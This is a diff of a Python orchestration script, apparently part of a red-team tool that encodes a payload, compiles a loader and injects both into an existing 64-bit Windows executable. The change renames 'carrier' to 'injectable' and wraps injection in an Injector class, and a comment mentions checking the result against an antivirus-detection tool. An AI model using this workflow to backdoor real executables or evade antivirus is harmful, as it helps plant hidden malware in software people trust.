@@ -17,7 +17,7 @@ from model.project import Project, prepare_project
 from model.settings import Settings
 from model.defs import *
 from log import setup_logging
-from model.carrier import DataReuseEntry
+from model.injectable import DataReuseEntry
 from utils import check_deps
 
 
@@ -142,7 +142,7 @@ def start_real(settings: Settings):
     project.init()
 
     # CHECK if 64 bit
-    if not project.carrier.superpe.is_64():
+    if not project.injectable.superpe.is_64():
         raise Exception("Binary is not 64bit: {}".format(project.settings.inject_exe_in))
 
     logger.info("--[ Config:  {}  {}  {}  {}".format(
@@ -169,8 +169,8 @@ def start_real(settings: Settings):
 
     # PREPARE DataReuseEntry for usage in Compiler/AsmTextParser
     # So the carrier is able to find the payload
-    project.carrier.add_datareuse_fixup(DataReuseEntry("supermega_payload", in_code=True))
-    entry = project.carrier.get_reusedata_fixup("supermega_payload")
+    project.injectable.add_datareuse_fixup(DataReuseEntry("supermega_payload", in_code=True))
+    entry = project.injectable.get_reusedata_fixup("supermega_payload")
     entry.data = phases.assembler.encode_payload(
         project.payload.payload_data, settings.decoder_style)  # encrypt
     observer.add_code_file("payload", project.payload.payload_data)
@@ -180,12 +180,12 @@ def start_real(settings: Settings):
         phases.compiler.compile(
             c_in = settings.main_c_path, 
             asm_out = settings.main_asm_path,
-            carrier = project.carrier,
+            injectable = project.injectable,
             settings = project.settings)
         
     # we have the carrier-required IAT entries in carrier.iat_requests
     # CHECK if all are available in infectable, or abort (early check)
-    functions = project.carrier.get_unresolved_iat()
+    functions = project.injectable.get_unresolved_iat()
     if len(functions) != 0 and settings.fix_missing_iat == False:
         raise Exception("IAT entry not found: {}".format(", ".join(functions)))
 
@@ -197,7 +197,12 @@ def start_real(settings: Settings):
         observer.add_code_file("carrier_shc", carrier_shellcode)
 
     # INJECT loader into an exe and do IAT & data references. Big task.
-    phases.injector.inject_exe(carrier_shellcode, settings, project.carrier, project.payload)
+    injector = phases.injector.Injector(
+        carrier_shellcode,
+        settings, 
+        project.injectable, 
+        project.payload)
+    injector.inject_exe()
     #observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
 
     # Check binary with avred
